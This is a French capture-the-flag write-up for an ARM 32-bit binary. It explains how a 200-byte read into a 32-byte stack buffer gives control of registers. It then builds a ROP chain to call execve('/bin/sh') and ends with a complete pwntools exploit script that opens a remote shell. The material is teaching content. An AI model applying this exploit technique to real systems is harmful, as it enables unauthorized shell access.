# Raptor Of Power!

Le code est en langage d'assembleur, écrit pour architecture ARM 32 bits.

Ne paniquez pas, restez calmes...

Il s'agit d'un programme qui demande un mot de passe à l'utilisateur, le compare à un mot de passe super méga secret, et affiche un message selon le résultat de la comparaison. J'aurais pu le faire en C, mais j'avais un peu de temps pendant mon stage, alors bon.

## Découverte du code

```asm
.global _start
```

Le symbole `_start` sera le point d'entrée de notre programme, un peu comme la fonction `main` en C. On le fait savoir au lieur ("linker" pour those who parlent fluently l'english). On y reviendra plus tard.

---

```asm
.section .data
```

C'est dedans qu'on définit les variables globales, comme les chaînes de caractères qui s'afficheront. On remarque le symbole `binsh` dont la valeur est "/bin/sh". Coïncidence ? Je ne pense pas...

---

```asm
.section .text
```

Bon, là ça se corse. Le symbole `_start` (le point d'entrée du programme), affiche simplement un message de bienvenue, et invite l'apprenti pwner que vous êtes à entrer un mot de passe. Ensuite, la ligne `bl _authenticate` est un appel à la fonction... `_authenticate`. À la fin, on appelle le syscall `exit`, dont le numéro est 1. Une liste plutôt bien fournie des syscalls est consultable [ici](https://syscalls.mebeim.net/?table=arm/32/eabi/latest).

### La fonction `_authenticate`

L'instruction `push` est là pour sauvegarder les registres sur la stack. On retrouve donc forcément plus tard l'instruction inverse `pop`, qui restaure les registres depuis la stack.

On réserve ensuite un espace de 32 octets sur la stack: `sub sp, #32`. "sp" est le registre qui pointe vers le "haut" de la stack.

```asm
mov r7, #3
mov r0, #0
mov r1, sp
mov r2, #200
svc #0
```

Ces quelques lignes lisent l'entrée depuis `stdin`, et stocke la chaîne dans la stack.

On passe directement à la fin de la fonction :

```asm
pop {r0, r1, r2, fp, pc}
```

On restaure simplement les registres depuis la stack.
Le reste n'est pas intéressant, il sert simplement à comparer l'entrée avec le vrai mot de passe.

## La vulnérabilité

Vous l'avez sans doute compris, on écrit au plus 200 octets alors qu'on n'en avait prévu que 32. On pourra donc écrire au-delà du buffer. En plus, le `pop` à la fin de `_authenticate` restaure les registres en fonction de ce qu'il trouve sur la stack.

Nous aurons donc la possibilité de contrôler les registres `r0`, `r1`, `r2`, `fp` et `pc`. Et comme `pc` contient l'adresse de la prochaine instruction à exécuter (comme `rip / eip` pour intel), on pourra mettre une autre instruction.

## L'exploitation

Notre objectif étant de lire le fichier flag.txt, on doit avoir un shell. On va alors construire une ROP chain. On appellera donc le syscall `execve`, qui prend comme paramètres le programme à appeler ("/bin/sh" dans notre cas), et les éventuels paramètres et variables d'environnement à lui donner. On va les mettre à 0, vu que ces paramètres ne servent pas ici.

L'appel ressemble donc à `execve("/bin/sh", NULL, NULL)`.

On a vu que grâce à l'instruction `pop {r0, r1, r2, fp, pc}` (à l'adresse 0x100dc) appelée directement, on peut directement écrire les 3 paramètres de `execve` (dans `r0`, `r1`, et `r2`). `fp` pourra prendre n'importe quelle valeur. `pc` contient l'adresse de la prochaine instruction à exécuter, et on le contrôle aussi. L'instruction `pop {r7, fp, pc}` (à l'adresse 0x1013c) nous permettra de contrôler `r7` qui contient le numéro de l'appel système, pour `execve` c'est 11.

Enfin, il nous faut le gadget pour l'appel système, pour réellement exécuter `execve`. Il y a une instruction `svc #0` à l'adresse 0x10138.

Script Python qui implémente tout ça :

```Python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./raptor_of_power")

context.binary = exe

POP_r7_fp_pc = 0x1013c
SVC = 0x10138
binsh = 0x1020a


def main():
    r = remote(HOST, PORT)
    rop = b"A" * 32
    rop += p32(binsh)           # r0
    rop += p32(0)               # r1
    rop += p32(0)               # r2
    rop += p32(0)               # fp
    rop += p32(POP_r7_fp_pc)    # pc
    rop += p32(11)              # r7
    rop += p32(0)               # fp
    rop += p32(SVC)             # pc

    r.sendlineafter(b"cave: ", rop)

    r.interactive()


if __name__ == "__main__":
    main()
```
